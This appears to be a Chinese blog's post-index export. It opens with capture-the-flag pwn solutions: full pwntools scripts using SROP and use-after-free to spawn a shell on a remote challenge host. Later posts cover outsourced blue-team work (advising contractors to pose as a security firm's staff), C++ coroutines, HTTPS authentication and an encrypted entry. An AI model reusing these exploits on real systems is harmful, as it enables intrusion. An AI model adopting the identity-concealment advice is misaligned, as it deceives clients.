0x48    p += p32(0x0)    p += p32(0x08048665)    sl(p)    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\nsmall采用srop进行构造出execve(“&#x2F;bin&#x2F;sh”, 0, 0)拿 shell\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;elf_path  = &#x27;small&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;81.70.195.166:10002&quot;# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    syscall_ret = 0x40100A    vul_addr  = 0x40100D     bss = elf.bss() + 0x100    sigframe = SigreturnFrame()    sigframe.rax = constants.SYS_read    sigframe.rdi = 0    sigframe.rsi = bss    sigframe.rdx = 0x200    sigframe.rsp = bss + 0x18    sigframe.rip = syscall_ret    p = b&#x27;\\x11&#x27; * 0x18 + p64(vul_addr) + p64(syscall_ret) + bytes(sigframe)    s(p)    # set rax=15 and call sigreturn    sleep(0.1)    p = b&#x27;\\x00&#x27; * 15    s(p)    sigframe = SigreturnFrame()    sigframe.rax = constants.SYS_execve    sigframe.rdi = bss  # &quot;/bin/sh&quot; &#x27;s addr    sigframe.rsi = 0x0    sigframe.rdx = 0x0    sigframe.rsp = bss + 0x18    sigframe.rip = syscall_ret    p = b&#x27;/bin/sh\\x00&#x27; + b&#x27;\\x00&#x27; * 0x10 + p64(vul_addr) + p64(syscall_ret) + bytes(sigframe)    sleep(0.1)    s(p)    # call sigreturn    p = b&#x27;\\x00&#x27; * 15    #db()    sleep(0.1)    s(p)def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\npaperuaf漏洞，开辟堆块到v8 - 8处，修改v9值为0xcccccccc拿shell。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;paper&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;81.70.195.166:10003&quot;# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def ad():    sla(&#x27;&gt;&#x27;, &#x27;1&#x27;)def rm(idx):    sla(&#x27;&gt;&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(idx))def wt(idx, n):    sla(&#x27;&gt;&#x27;, &#x27;3&#x27;)    sla(&#x27;:&#x27;, str(idx))    sla(&#x27;:&#x27;, str(n))def fd():    sla(&#x27;&gt;&#x27;, &#x27;4&#x27;)def mv(idx):    sla(&#x27;&gt;&#x27;, &#x27;5&#x27;)    sla(&#x27;?&#x27;, str(idx))def sh():    sla(&#x27;&gt;&#x27;, &#x27;6&#x27;)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    ad()    rm(0)    fd()    ru(&#x27;0x&#x27;)    v8 = int(r(12), 16)    li(&#x27;v8: &#x27; + hex(v8))    mv(0x21)    wt(0, v8 - 8)    ad() # 1    ad() # 2    wt(2, 0xCCCCCCCC)    sh()    #db()    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\nmanagebooks漏洞为uaf，在打印Summary函数中，采用函数指针调用，修改该函数指针，即可劫持rip，先泄漏libc，再调用system即可。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;managebooks&#x27;libc_path = &#x27;/glibc/2.27/64/lib/libc.so.6&#x27;# remote server ip and porthost = &quot;81.70.195.166:10004&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def ad(name_sz, name, data_sz, data):    sla(&#x27;&gt;&gt;&#x27;, &#x27;1&#x27;)    sla(&#x27;:&#x27;, str(name_sz))    sa(&#x27;:&#x27;, name)    sla(&#x27;:&#x27;, str(data_sz))    sa(&#x27;:&#x27;, data)def rm(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(idx))def ch(idx, sz, data):    sla(&#x27;&gt;&gt;&#x27;, &#x27;3&#x27;)    sla(&#x27;:&#x27;, str(idx))    sla(&#x27;:&#x27;, str(sz))    sa(&#x27;:&#x27;, data)def rd(idx):    sla(&#x27;&gt;&gt;&#x27;, &#x27;4&#x27;)    sla(&#x27;:&#x27;, str(idx))#--------------------------exploit--------------------------def exploit():    bookcase = 0x6020C0    li(&#x27;exploit...&#x27;)    ad(0x10, &#x27;AAAA&#x27;, 0x500, &#x27;bbbb&#x27;)    rm(0)    rm(0)    ch(0, 0x80, &#x27;\\x10&#x27;) # free sum and alloc    ad(0x10, p64(elf.plt[&#x27;puts&#x27;]), 0x30, &#x27;/bin/sh\\x00&#x27;) # 1    &#x27;&#x27;&#x27;    rm(0)    #ad(0x10, p64(bookcase), 0x20, &#x27;bbbb&#x27;)    &#x27;&#x27;&#x27;    rd(0) # leak libc    leak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)    libc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 976 - 0x10    li(&#x27;libc_base: &#x27; + hex(libc_base))    rm(1)    rm(1)    ad(0x10, p64(libc_base + libc.sym[&#x27;system&#x27;]), 0x30, &#x27;\\x00&#x27;) # 1    #db()    rd(1) # call systemdef finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        libc_path = &#x27;./libc.so.6&#x27;        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"中级蓝队护网外包驻场总结","url":"/2021/04/24/security/hw/2021-04-hw/","content":"2021-04 中级蓝队护网外包驻场总结HW涉及人员框架我这次参加hw就涉及6种不同类型的人，分别如下：\n这里说一下一般护网蓝队产业的大致框架。\n甲方: 出钱方\n乙方: 参加hw的工具人 (也可以称外包人员)\n丙方: 某安全公司，负责面试乙方，与甲方和客户对接，将乙方冒充是自己公司的安全服务工具人，为客户提供服务。\n丁方: 丙方公司的真正安服人员（他们不知道乙方是否是他们公司的，会有丙方人员联系他们，说乙方是自己的安服人员）\n中介: 四处找乙方的人\n客户: 需要受益于丙方提供安全服务的客户。\n面试在面试的时候，接触最多的就是中介与丙方，中介找人，你把简历投过去，他负责将简历投给丙方（各大安全公司），若丙方看中了你的简历，这时丙方会给你安排技术面试，一般只有一面。若面试面过了，丙方一般会再次确认你是否能去，还有薪资等，然后根据客户的需求，他们会将乙方安排到相应的地方。\n面试还是比较简单，把简历写得装一点，主要还是你拥有护网经验，价格也不要抬得太高。我第一次面护网是技术面直接垮掉，第二面试简历写得很屌，但是我们说的价格偏高了，也没通过，第三次面试说得不是很好，还好简历上拥有护网经验，由于上海急招，我被安排到上海来了。\n入场一般丙方会让乙方冒充他们自己公司的安服人员，在客户现场，会出现，客户、丁方、还有乙方。客户和丁方都会认为乙方也是丁方，注意这里很重要（出去之后，就要说自己就是丁方）。\n接下来就是你要配合丁方工作了，工作性质有两种，一种是一直拥有丁方人员与你一起工作，另一种是你到来之后，只剩你一个人对付客户。看客户和丙方是怎么安排的。\n我来到场地之后，丙方会安排丁方请求客户一起来接待我，然后就是听从客户的安排，一定要说自己就是丁方人员，不然会吃大亏，我就吃了。\n工作一般形式是每天工作12小时，有白班和晚班，白班一般早上9点上班，晚上9点下班，晚班的话就相反，晚上9点上班，第二天早上9点下班，天天上班。而我呢，我就比较轻松955工作制度，早上9点上班，下午5点下班，每周只工作5天，因为周末，流量小得可怜。。。\n工作内容一般就是，看日志，研判，请求封ip，溯源，写报告。\n我是驻场人员，要得更新丙方的监控系统，分析各种可以文件，还要与客户那边对接，比如出现什么可以文件，及时与客户上报，查清可疑文件来源，驻场人员一定要与客户多多沟通交流啊，不然客户都不知道你们这公司在干嘛，驻场人员相当与一个为客户提供安全服务的人，要让客户觉得你们安全服务的提供对他们的业务有安全保障，一定一定要有自己的安全防护策略，每日该干什么，一定要计划好，不要划水，记得每日写流量报告给客户，越多越好。\n错误总结我也是第一次做护网，很多概念不知道，特别是面试成功之后，对接就很懵，没太清楚人员框架，与不该说的人说了某些话，特意写了这份总结来梳理一下，以后少走些弯路。\n\n混淆丙方和丁方，在丁方那边说着与丙方的话，与他谈钱。\n\n没弄清楚丙方排我来的安排，真实的告诉了客户自己的身份，导致泄漏自己是外包人员，客户就知道我是外包人员了。\n​\t客户: 你是xxx公司的么？\n​\t我: 不算是吧\n​\t客户: 那你就是xxx公司派来的外包？\n这导致了我周末没上班的原因，少了掐钱的机会了。\n\n误操作修改了客户hw人员的群名称。\n\n误判断ip为内网ip。\n\n轻易判断流量是否危险，比如撞库行为，rsync未授权，sql注入等\n\n感觉危险的操作就轻易封ip\n\n未看清合同工期怎么算，到底一天几小时，几小时才能算一天？\n\n未跟学校请好假，学校闹得鸡犬不宁\n\n之前报告未交给客户，而是交给了丙方，记得两方都交，交给丙方不要透露客户那边的漏洞情况，还有内网结构，避免造成不可估测的巨大损失。\n\n在回答客户问题时，总是慌（慌你妹的慌）\n\n出门在外，不要让别人太看清你，保守一点\n\n未向学校请假出去，就别动态了\n\n做项目是在为客户服务，不是在为丙服务\n\n做事之前考虑清楚，别慌慌张张的。\n\n\n","categories":["security"],"tags":["hvv"]},{"title":"C++协程实现","url":"/2021/04/24/dev/language/cpp/croutine/","content":"协程实现C1. 利用 C 语言的 setjmp 和 longjmp，函数中使用 static local 的变量来保存协程内部的数据。\n函数原型：\nint setjmp(jmp_buf envbuf);void longjmp(jmp_buf envbuf, int val);\n\n\n\n先调用setjmp，用变量envbuf记录当前的位置，然后调用longjmp，返回envbuf所记录的位置，并使setjmp的返回值为val。使用longjmp后，envbuf的内容会被销毁。\n 1 #include &lt;stdio.h&gt;  2 #include &lt;setjmp.h&gt; 3   4 jmp_buf buf;  5  6 banana() 7 &#123;  8     printf(&quot;in banana() \\n&quot;);  9     longjmp(buf,1); 10     printf(&quot;you&#x27;ll never see this,because i longjmp&#x27;d&quot;); 11 &#125; 12 13 main() &#123; 15     if(setjmp(buf)) 16         printf(&quot;back in main\\n&quot;); 17     else18     &#123; 19         printf(&quot;first time through\\n&quot;); 20         banana(); \t&#125; &#125;\n\n打印结果：\nfirst time throughin banana()back in main\n\n2、利用C语言语法switch-case的技巧来实现\n设置一个标识符，改变标识符的值，通过switch-case对标识符值的判断操纵各协程函数轮流执行。\n每个协程函数可配一个结构体，保存栈内容和状态机。\n代码：https://github.com/georgeredinger/protothreads\n3、使用汇编代码来切换上下文(实现c协程) 。\n构建一个结构体保存栈内容和当前位置等上下文信息，利用汇编语言的跳转实现协程功能。\n详情见：https://www.cnblogs.com/heluan/p/9899824.html\n4、利用操作系统提供的接口：Linux的ucontext，Windows的Fiber。（云风的coroutine）\nucontext：　makecontext(）　　　　　　　创建上下文   　　\n　　　　　　getcontext()　　　　　　　　　读取上下文\n　　　　　　setcontext()　　　　　　　　　设置上下文\n　　　　　　swapcontext()　　　　　　　　跳转上下文\nFiber(纤程)：ConverThreadToFiber()　 　　从当前线程进入纤程\n　　　　　　CreateFiber()　　　　　　 　　创建新纤程\n　　　　　　SwitchToFiber()　　　　　 　　切换到纤程\n　　　　　　DeleteFiber()　　　　　　 　　删除纤程\n　　　　　　　　　　　　　　　　　　　　如果删除当前纤程，会导致它所在的线程退出 \n操作系统的接口函数本身，提供了保存栈内容的功能。 \nC++说到 c++ 上的协程，boost 里其实已经有相关的实现了，不过接口上看用起来有些麻烦，单纯从语法上来说，我觉得 Lua 的协程最简洁易用了，概念上也比较直接，为什么不做一个类似的呢？所以我就打算照着 Lua 来山寨一个，只需要支持四个接口就够了：\ncreate coroutinerun/resume coroutineYield running corouinteIsCoroutineAlive\n\n\n\n存与恢复上下文实现协程&#x2F;线程，最麻烦莫过于保存和切换上下文了，好在 makecontext，swapcontext 这几个函数相当好用，已经完全帮忙解决了这个难题：makecontext 可以帮我们建立起协程的上下文，swapcontext 则可以切换不同的上下文，从而实现那种把当前函数暂时停住，切换出去执行别的函数然后再切换回来继续执行的效果：\n#include &lt;iostream&gt;#include &lt;ucontext.h&gt;using namespace std;static char g_stack[2048];static ucontext_t ctx,ctx_main;void func()&#123;    // do something.    cout &lt;&lt; &quot;enter func&quot; &lt;&lt; endl;    swapcontext(&amp;ctx, &amp;ctx_main);    cout &lt;&lt; &quot;func1 resume from yield&quot; &lt;&lt; endl;    // continue to do something.&#125;int main()&#123;   getcontext(&amp;ctx);   ctx.uc_stack.ss_sp = g_stack;   ctx.uc_stack.ss_size = sizeof g_stack;   ctx.uc_link = &amp;ctx_main;       makecontext(&amp;ctx, func, 0);   cout &lt;&lt; &quot;in main, before coroutine starts&quot; &lt;&lt; endl;   swapcontext(&amp;ctx_main, &amp;ctx);   cout &lt;&lt; &quot;back to main&quot; &lt;&lt; endl;   swapcontext(&amp;ctx_main, &amp;ctx);      cout &lt;&lt; &quot;back to main again&quot; &lt;&lt; endl;   return 0;&#125;\n\n如上代码所示，显然我们只要简单包装一下 swapcontext，很容易就可以实现 Yield 和 Resume，有了它们的帮助协程做起来就容易多了。\n使用与实现在使用 makecontext，swapcontext 的基础上，参看这里，代码写下来总共才200多行，出乎意料的简单，用起来也很方便了：\n#include &quot;coroutine.h&quot;#include &lt;iostream&gt;using namespace std;CoroutineScheduler* sched = NULL;void func1(void* arg)&#123;    uintptr_t ret;    cout &lt;&lt; &quot;function1 a now!,arg:&quot; &lt;&lt; arg &lt;&lt; &quot;, start to yield.&quot; &lt;&lt; endl;    ret = sched-&gt;Yield((uintptr_t)&quot;func1 yield 1&quot;);    cout &lt;&lt; &quot;1.fun1 return from yield:&quot; &lt;&lt; (const char*)ret &lt;&lt; endl;    ret = sched-&gt;Yield((uintptr_t)&quot;func1 yield 2&quot;);    cout &lt;&lt; &quot;2.fun1 return from yield:&quot; &lt;&lt; (const char*)ret &lt;&lt; &quot;, going to stop&quot; &lt;&lt; endl;&#125;void func2(void* s)&#123;    cout &lt;&lt; &quot;function2 a now!, arg:&quot; &lt;&lt; s &lt;&lt; &quot;, start to yield.&quot; &lt;&lt; endl;    const char* y = (const char*)sched-&gt;Yield((uintptr_t)&quot;func2 yield 1&quot;);    cout &lt;&lt; &quot;fun2 return from yield:&quot; &lt;&lt; y &lt;&lt;&quot;, going to stop&quot; &lt;&lt; endl;&#125;int main()&#123;    sched = new CoroutineScheduler();    bool stop = false;    int f1 = sched-&gt;CreateCoroutine(func1, (void*)111);    int f2 = sched-&gt;CreateCoroutine(func2, (void*)222);    while (!stop)    &#123;        stop = true;        if (sched-&gt;IsCoroutineAlive(f1))        &#123;            stop = false;            const char* y1 = (const char*)sched-&gt;ResumeCoroutine(f1, (uintptr_t)&quot;resume func1&quot;);            cout &lt;&lt; &quot;func1 yield:&quot; &lt;&lt; y1 &lt;&lt; endl;        &#125;        if (sched-&gt;IsCoroutineAlive(f2))        &#123;            stop = false;            const char* y2 = (const char*)sched-&gt;ResumeCoroutine(f2, (uintptr_t)&quot;resume func2&quot;);            cout &lt;&lt; &quot;func2 yield:&quot; &lt;&lt; y2 &lt;&lt; endl;        &#125;    &#125;    delete sched;    return 0;&#125;\n\n如上所示，Yield 里传的参数会在调用 Resume 时被返回，同理 Resume 里的第二个参数，会在 Yield 里被返回，这种机制也是模仿 Lua 来的，有些时候可以用来在协程间传递一些参数，很方便，看起来也挺酷的，但在实现上却相当地简洁，核心代码如下：\n// static functionvoid CoroutineScheduler::SchedulerImpl::Schedule(void* arg)&#123;    assert(arg);    SchedulerImpl* sched = (SchedulerImpl*) arg;    int running = sched-&gt;running_;    coroutine* cor = sched-&gt;id2routine_[running];    assert(cor);    cor-&gt;func(cor-&gt;arg);    sched-&gt;running_ = -1;    cor-&gt;status = CO_FINISHED;&#125;// resume coroutine.uintptr_t CoroutineScheduler::SchedulerImpl::ResumeCoroutine(int id, uintptr_t y)&#123;    coroutine* cor = id2routine_[id];    if (cor == NULL || cor-&gt;status == CO_RUNNING) return 0;    cor-&gt;yield = y;    switch (cor-&gt;status)    &#123;        case CO_READY:            &#123;                getcontext(&amp;cor-&gt;cxt);                cor-&gt;status = CO_RUNNING;                cor-&gt;cxt.uc_stack.ss_sp = cor-&gt;stack;                cor-&gt;cxt.uc_stack.ss_size = stacksize_;                // sucessor context.                cor-&gt;cxt.uc_link = &amp;mainContext_;                running_ = id;                makecontext(&amp;cor-&gt;cxt, (void (*)())Schedule, 1, this);                swapcontext(&amp;mainContext_, &amp;cor-&gt;cxt);            &#125;            break;        case CO_SUSPENDED:            &#123;                running_ = id;                cor-&gt;status = CO_RUNNING;                swapcontext(&amp;mainContext_, &amp;cor-&gt;cxt);            &#125;            break;        default:            assert(0);    &#125;    uintptr_t ret = cor-&gt;yield;    if (running_ == -1 &amp;&amp; cor-&gt;status == CO_FINISHED) DestroyCoroutine(id);    return ret;&#125;uintptr_t CoroutineScheduler::SchedulerImpl::Yield(uintptr_t y)&#123;    if (running_ &lt; 0) return 0;    int cur = running_;    running_ = -1;    coroutine* cor = id2routine_[cur];    cor-&gt;yield = y;    cor-&gt;status = CO_SUSPENDED;    swapcontext(&amp;cor-&gt;cxt, &amp;mainContext_);    return cor-&gt;yield;&#125;\n\n\n\nref:  https://www.cnblogs.com/catch/p/3617962.html\n","categories":["language"],"tags":["c++"]},{"title":"HTTPS单项认证与双向认证","url":"/2021/04/23/security/crypto/https_identify/","content":"HTTPS单项认证与双向认证HTTP（HyperText Transfer Protocol，超文本传输协议）被用于在Web浏览器和网站服务器之间传递信息，在TCP&#x2F;IP中处于应用层。这里提一下TCP&#x2F;IP的分层共分为四层：应用层、传输层、网络层、数据链路层; 分层的目的是：分层能够解耦，动态替换层内协议\n然而HTTP也有以下明显缺点：\n\n通信使用明文，内容可能被窃听\n不验证通信方的身份，因此有可能遭遇伪装\n无法证明报文的完整性，所以有可能遭到篡改\n\n这样，HTTPS就出现来弥补HTTP的不足。HTTPS中的S表示SSL或者TLS，就是在原HTTP的基础上加上一层用于数据加密、解密、身份认证的安全层，即\n\nHTTP + 加密 + 认证 + 完整性保护 &#x3D; HTTPS\n\n加密相关的预备知识：对称加密和非对称加密。\n\n对称加密 ： 加密和解密数据使用同一个密钥。这种加密方式的特点是速度很快，常见对称加密的算法有 AES；\n非对称加密： 加密和解密使用不同的密钥，这两个密钥形成有且仅有唯一的配对，叫公钥和私钥。数据用公钥加密后必须用私钥解密，数据用私钥加密后必须用公钥解密。一般来说私钥自己保留好，把公钥公开给别人（一般公钥不会单独出现，而是会写进证书中），让别人拿自己的公钥加密数据后发给自己，这样只有自己才能解密。 这种加密方式的特点是速度慢，CPU 开销大，常见非对称加密算法有 RSA。\n\nCA证书的相关知识： CA证书是由CA（Certification Authority）机构发布的数字证书。其内容包含：电子签证机关的信息、公钥用户信息、公钥、签名和有效期。这里的公钥服务端的公钥，这里的签名是指：用hash散列函数计算公开的明文信息的信息摘要，然后采用CA的私钥对信息摘要进行加密，加密完的密文就是签名。 即：证书 &#x3D; 公钥 + 签名 +申请者和颁发者的信息。 客户端中因为在操作系统中就预置了CA的公钥，所以支持解密签名（因为签名使用CA的私钥加密的）\n单项认证\n客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。\n\n服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端\n\n客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥\n\n客户端生成一个随机数（密钥F），用刚才等到的服务端B_公钥去加密这个随机数形成密文，发送给服务端。\n\n服务端用自己的B_私钥去解密这个密文，得到了密钥F\n\n服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式\n\n\n双向认证双向认证和单向认证原理基本差不多，单向认证客户端需要认证服务端，而在双向认证中增加了服务端对客户端的认证\n\n客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。\n\n服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端\n\n客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥\n\n客户端发送自己的客户端证书给服务端，证书里面有客户端的公钥：C_公钥**\n\n客户端发送支持的对称加密方案给服务端，供其选择**\n\n服务端选择完加密方案后，用刚才得到的C_公钥去加密选好的加密方案\n\n客户端用自己的C_私钥去解密选好的加密方案**，客户端生成一个随机数（密钥F），用刚才等到的服务端B_公钥去加密这个随机数形成密文，发送给服务端。\n\n服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式\n\n\n总结保证数据安全传输上使用对称加密和非对称加密相结合的方式来进行的，简单来说就是通过一次非对称加密算法进行了最终通信密钥的生成、确认和交换，然后在后续的通信过程中使用最终通信密钥进行对称加密通信。之所以不是全程非对称加密，是因为非对称加密的计算量大，影响通信效率。\nref: https://www.cnblogs.com/kai-/p/13652284.html\n","categories":["security"],"tags":["crypto"]},{"title":"觉醒之路","url":"/2021/04/22/life/myself/%E8%A7%89%E9%86%92%E4%B9%8B%E8%B7%AF/","content":"\n  69d01b89b9601e5c57b37cfc1411681a1f21976d1d4b0aa15d31e1e10e338977ea9cf122b2082b3d1d72484c0d2ca3a840d669a44505ebcf4915180d97988c349f4e6465fa97067e43ab7444b2a0858a65ffb28f2745a490c24f657788d7039117603763ae64f5de03367470fad6ac6d9c91f7375f3f621963ececb484854eb5e655bef41ec6da9976c9e139d68615224479ffaa5562a36843c8066e7782944312027323246babf87922c55ab27af17c75f3b7fb0d5fe2e23be099466975fb027ebd6804d9ec04e59031222360ec6ffdac32cef89d9b035005955638619da5bed87bf12cf2e84dd5389d5325b8ee6f567794660b3a3d4b2e44cb227f246dce099194f27098dd2f56733d0725917116b9388d8275e6f4f1c211df5993ffe5585e835719ded3f48e545aa719112a7ba46ce4082b4b8dba90e9bf20b5c9dcc983e7e4aeae679bee27b99bc4587f1c1cee3f524303fb00672bddf0c574fd1ccfa6598bb775c7687bdcfec538b230117ee3dceed4f818e6afe67f07723aa5544dcec8c5e51e2b046cd71a910326fafa08c1596505db568ac8ec9ecabd476b1eeba0f14cd7e16a50a878e82bcf8a5ffb2dd7f83318197156fbd03ef6604397d20b3587d7b314ecc8e06076bd923ed867b3882cf5e24d90e6abf264fb31bdec76c691872bbf6e4fdcc9a8ca9be5d166a9fb3e1a21df1c4c587772099e349f4906ef1fa0b7b9936d90cc6be190091009593fd1323f72645b072c21f33b0d22b5624b2a68997f1ab7c60a49278adf908e24204e9394e56ba318f38f2c75b02d1ef0ccc4c6dd294c1a7c9064a282eb921333e4b0786291fe98dbbc1a5a7b01d26e97ddcbdd17ea2923cc88bd36e1b1a615daa9c3200cab46927437b943775a64475ebf9a2343b72024be25c7e7bf819c996e934dfc96ca3e213154fdb9a69086ba68d1a04cf55fcbaa3a49ca24df3b1e6ed6157b9bc6d43609c1f1b2bb5be44ad3411e9b8a60957e2af469a3d6319c2a6026bc61a3c0e941cf6c65e228dd90c26d0a5a59b22701e6029769e02f88c74e865e11453ee709f78ca42056663bda87f65548115bd20675a8c7c33f8fa70a690b52c854c708fb935d3245e95b5904972a396dd566c88bd8e2e77f3a7c89056dacf1a3a1299eae0834fc9e808773fba86007fffa3622449c983461a153025d642e15d02c8baa7f28c48e112edee43d21027177cb61f23d333fee1510131905de318a06406d701a5e4e1b7e0958dbede251933b9d621987e312bedd073139f8bcb61a0c9d212c5c01f7b1e761e14d052c2c8e1cd21bdd81105716d215f51c0f9e76bd008e43db8352ebce206a45d60c8366162ad86a0457af4912ded81fdd2c8744219a2eedfed966a8a8115147783c50bc7e6deb417507edba1f632e44802508737289b26bd1bf97d8c9c559caec61b332852c15c7de6992943b9375ab8d9f60f5962188ff53debbbbb15cf06f66a653cdd5476f681981905a0bbb514cebd7fe406176434963f053f47f5c7a7a176db48f3aa280942b53663b956635de0ff1527bb8ade27c233e3e53ef934109a8a6d2ea33b618b8b90de61319f00cf23fc90ebf85337921348c13385de9d86cdbd68bc3b6e8f81a07741d37400c6251f13bee19e140c63c8bc7043362a4030385b3a418ee1a31ef8ccc8b88137cd640097c5da9c175fda82b4c9dc13a7cf2ad46a6f6fb63910f35dcec3b981173b0958ae3618247ea5f873cc721ffa0c2e32a42daf1a65a9f0b25bebd5caaa3d97d810eec845c3ce80dbd3d2ded810368cfb379af3eee4805489a48f3135544b5dcac6fd364aab1ab4c072a1df9a8bebfbddd707d9569e82479a4835538bed13e757e1188b7415462bfea1b49c3c4c20cacdb267f5f2cc73060558e82087350721bb538dcf6e7325c3071bf433cb0de897fb9d4404a8a833f567ae3eca35e4feb391606d0739c331507fed061928c811a5835f8ac9700714d938a24c71eebe6d2264b0bcaa8ba5efc15fdd10ca550bbbfd65fe9f285999aa823ebde2765a8a2555e87916f122205bd30e3e9b336e1b2846983850b7de1a8866179e79806a190099009773bde7d2d9e7cbc3e134edcdda086c8feca26227dfeec7c380a4e69dbcb7cef168e4915404ece3786459d3824f096e4098446a90d75bd64fd258b056dcf42cca5d60e452691f136223858c280d301b5aeef23ef154b568c44c415d0ef3c89e1eab6f3534a6e2280ba347dadcd9de2b12d15d64b8d9d8723c57238b155e566a26d30e7a6491caca1e61177eb5c04dc7fa25385ca6e9c4f07ce9fbda1f17e4dd100af77bd6393a18edf6e5feaf3f6050683684542efed5b8e4cc786600336cacac13bbaaacdff40d82be073d514433fc8f5c922a36115e572a75d8d0b6d77624053ce8ee3f03f247d491d40fed49eee81286577cec3781a2d83540918684303585aa1bf03532644d2e6496f48c3fb13cfdef5c8c9afbd6dfd9b4a750a476ef032b4b7bdb6976a3d09c49efee6cca7a1a1a6e1540b71746f919e87b240915d0d42417b2223eb2182689beeab07c9343492c56a338e5a2edf9090f0f5f91985ec096e06bdcb94bf8cd953ed12227309194e1e1740229f470bf1c2ae46eafbd2ecf42adf9ab76a99b5ff24c150b8875d71935d1342ebc9d2428bea3e270facc986601543c6ed4093119f4f624d2fe2190d18dd850a14acbd6a6d5c4db9afc2426e502311978e3933d80abc0b55720f2a0eeb25a46264d518f10a08d4dc2ba5985c3ccc3db15528eb2b0e53967d7608cb50c50cf2b0c2c16e76bbba79e4d9c